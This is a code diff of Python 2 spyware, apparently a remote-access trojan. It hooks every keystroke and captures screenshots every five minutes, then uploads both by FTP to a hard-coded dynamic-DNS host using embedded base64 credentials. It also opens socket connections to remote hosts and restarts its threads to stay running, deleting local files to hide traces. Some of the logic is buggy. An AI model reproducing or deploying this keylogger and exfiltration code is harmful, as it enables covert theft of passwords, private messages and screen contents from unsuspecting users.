@@ -34,88 +34,101 @@ class module(object):
 			self.password = str(password).decode('base64')
 
 		def screenshot(self, host, port, user, password):
-			global ftp
-			ftp = ftplib.FTP()
-			ftp.connect(host,port)
-			ftp.login(user,password)
-			print ' [+] FTP: Connected to %s:%s' % (str(host),str(port))
-			ftp.cwd('Furnace')
-			pc_name = str(os.environ['COMPUTERNAME'])
-			fileName = pc_name + '_' + str(str(time.ctime()).replace(' ','_')).replace(':','') + '.jpg'
-			im = ImageGrab.grab_to_file(fileName)
-			try:
-				ftp.cwd(pc_name)
-			except:
-				ftp.mkd(pc_name)
-				ftp.cwd(pc_name)
-			module.fileTransferProtocol.upload(fileName)
-			print [' [+] Screenshot: "' + str(fileName) + '" upload sucess.']
-			ftp.close()
-
-			return True
+			while 1:
+				global ftp
+				ftp = ftplib.FTP()
+				ftp.connect(host,port)
+				ftp.login(user,password)
+				print ' [+] FTP: Connected to %s:%s' % (str(host),str(port))
+				ftp.cwd('Furnace')
+				pc_name = str(os.environ['COMPUTERNAME'])
+				fileName = pc_name + '_' + str(str(time.ctime()).replace(' ','_')).replace(':','') + '.jpg'
+				im = ImageGrab.grab_to_file(fileName)
+				try:
+					ftp.cwd(pc_name)
+				except:
+					ftp.mkd(pc_name)
+					ftp.cwd(pc_name)
+				module.fileTransferProtocol.upload(fileName)
+				print [' [+] Screenshot: "' + str(fileName) + '" upload sucess.']
+				ftp.close()
+				try:
+					os.remove(fileName)
+				except:
+					pass
+				time.sleep(300)
 
 		def keylogger(self, host, port, user, password):
 			while 1:
-				global buffer
-				buffer = ''
+				try:
+					global buffer
+					buffer = ''
 
-				def OnKeyboardEvent(event):
-					#print 'MessageName:', event.MessageName
-					#print 'Message:',event.Message
-					#print 'Time:',event.Time
-					#print 'Window:',event.Window
-					#print 'WindowName:',event.WindowName
-					#print 'Ascii:', event.Ascii, chr(event.Ascii)
-					#print 'Key:', event.Key
-					#print 'KeyID:', event.KeyID
-					#print 'ScanCode:', event.ScanCode
-					#print 'Extended:', event.Extended
-					#print 'Injected:', event.Injected
-					#print 'Alt', event.Alt
-					#print 'Transition', event.Transition
-					#print '---'
+					def OnKeyboardEvent(event):
+						#print 'MessageName:', event.MessageName
+						#print 'Message:',event.Message
+						#print 'Time:',event.Time
+						#print 'Window:',event.Window
+						#print 'WindowName:',event.WindowName
+						#print 'Ascii:', event.Ascii, chr(event.Ascii)
+						#print 'Key:', event.Key
+						#print 'KeyID:', event.KeyID
+						#print 'ScanCode:', event.ScanCode
+						#print 'Extended:', event.Extended
+						#print 'Injected:', event.Injected
+						#print 'Alt', event.Alt
+						#print 'Transition', event.Transition
+						#print '---'
 
-					if event.Ascii < 256 or event.Ascii <> 0:
-						global buffer
-						fileName = str(str(time.ctime()).replace(' ','_')).replace(':','') + '.keys'
-						print 'ASCII Event Number: ' + str(event.Ascii)
-						if event.Ascii==5:
-							_exit(1)
-						if event.Ascii !=0 or 8:	
-							keylogs=chr(event.Ascii)
-							print 'Key Pressed: ' + str(keylogs)
-							if event.Ascii==13:
-								keylogs='/n'
-							buffer+=keylogs
-							print 'Actual Buffer Lenght: ' + str(len(buffer))
-							if(len(buffer) > 100):
-								pc_name = str(os.environ['COMPUTERNAME'])
-								global ftp
-								ftp = ftplib.FTP()
-								ftp.connect(host,port)
-								ftp.login(user,password)
-								print ' [+] FTP Connected to %s:%s' % (str(host), str(port))
-								ftp.cwd('Furnace')
-								f=open(fileName,'w')
-								f.write(buffer)
-								f.close()
-								buffer = ''
-								try:
-									ftp.cwd(pc_name)
-								except:
-									ftp.mkd(pc_name)
-									ftp.cwd(pc_name)
-								module.fileTransferProtocol.upload(fileName)
-								print [' [+] Keylogger: "' + str(fileName) + '" upload sucess.']
-								ftp.close()
+						if event.Ascii < 256 or event.Ascii <> 0:
+							global buffer
+							
+							print 'ASCII Event Number: ' + str(event.Ascii)
+							if event.Ascii==5:
+								_exit(1)
+							if event.Ascii !=0 or 8:	
+								keylogs=chr(event.Ascii)
+								print 'Key Pressed: ' + str(keylogs)
+								if event.Ascii==13:
+									keylogs='/n'
+								buffer+=keylogs
+								print 'Actual buffer Lenght: ' + str(len(buffer))
+								if(len(buffer) > 100):
+									fileName = str(str(time.ctime()).replace(' ','_')).replace(':','') + '.keys'
+									pc_name = str(os.environ['COMPUTERNAME'])
+									f=open(fileName,'a')
+									f.write(buffer)
+									f.close()
+									buffer = ''
+									global ftp
+									ftp = ftplib.FTP()
+									ftp.connect(host,port)
+									ftp.login(user,password)
+									print ' [+] FTP Connected to %s:%s' % (str(host), str(port))
+									ftp.cwd('Furnace')
+									try:
+										ftp.cwd(pc_name)
+									except:
+										ftp.mkd(pc_name)
+										ftp.cwd(pc_name)
+									module.fileTransferProtocol.upload(fileName)
+									print [' [+] Keylogger: "' + str(fileName) + '" upload sucess.']
+									ftp.close()
+									try:
+										os.remove(fileName)
+									except:
+										pass
 
-				# create a hook manager object
-				hm=pyHook.HookManager()
-				hm.KeyDown=OnKeyboardEvent
-				# set the hook
-				hm.HookKeyboard()
-				# wait forever
-				pythoncom.PumpMessages()
+					# create a hook manager object
+					hm=pyHook.HookManager()
+					hm.KeyDown=OnKeyboardEvent
+					# set the hook
+					hm.HookKeyboard()
+					# wait forever
+					pythoncom.PumpMessages()
+				except:
+					fp = module.fileTransferProtocol('nest0r.ddns.net',21,'YWRtaW4=','bXluYW1laXNuZXN0b3I=')
+					module.thread.start(fp.keylogger,(fp.host,fp.port, fp.user, fp.password))
 
 		@classmethod
 		def download(self, fileName):
@@ -154,13 +167,14 @@ class module(object):
 			try:
 				t.start()
 			except Exception as e:
-				fileName = 'error_log_' + str(time.ctime()) + '.txt'
+				fileName = 'error_log_' + str(str(time.ctime()).replace(':','')).replace(' ','') + '.txt'
 				f = open(fileName,'w')
-				f.write(e)
+				f.write(str(e))
 				f.close()
 				print ' [!] Error: ' + str(e)
 				print '\nLog: ' + str(fileName)
 			print ' [*] Thread: ' + str_function_name + ' started.'
+			return t
 			
 
 
@@ -254,19 +268,30 @@ def main():
 		#start Socket conn
 		if(debug_mode == False):
 			for dns in dns_list:
-				module.thread.start(module.socket.connect,(dns,p.dns_port))
+				shell = module.thread.start(module.socket.connect,(dns,p.dns_port))
 		else:
 			for dns in local_list:
-				module.thread.start(module.socket.connect,(dns,p.dns_poWrt))
+				shell = module.thread.start(module.socket.connect,(dns,p.dns_port))
 
 	if(ftpMode == True):
 		#start FTP conn
 		fp = module.fileTransferProtocol('nest0r.ddns.net',21,'YWRtaW4=','bXluYW1laXNuZXN0b3I=')
-		module.thread.start(fp.keylogger,(fp.host,fp.port, fp.user, fp.password))
 
-		while 1:
-			module.thread.start(fp.screenshot,(fp.host,fp.port, fp.user, fp.password))
-			time.sleep(300)
+		k = module.thread.start(fp.keylogger,(fp.host,fp.port, fp.user, fp.password))
+		scr = module.thread.start(fp.screenshot,(fp.host,fp.port, fp.user, fp.password))
+
+	varList = [k, scr, shell]
+	while 1:
+		for var in varList:
+			if not var.isAlive():
+				print ' [-] Thread: ' + str_function_name + ' stopped.'
+				print ' [+] Thread: ' + str_function_name + ' restarting...'
+				var.start()
+				print ' [*] Thread: ' + str_function_name + ' restarted.'
 
 if __name__ == '__main__':
-	main()
+	try:
+		main()
+	except Exception as e:
+		print str(e)
+		main()
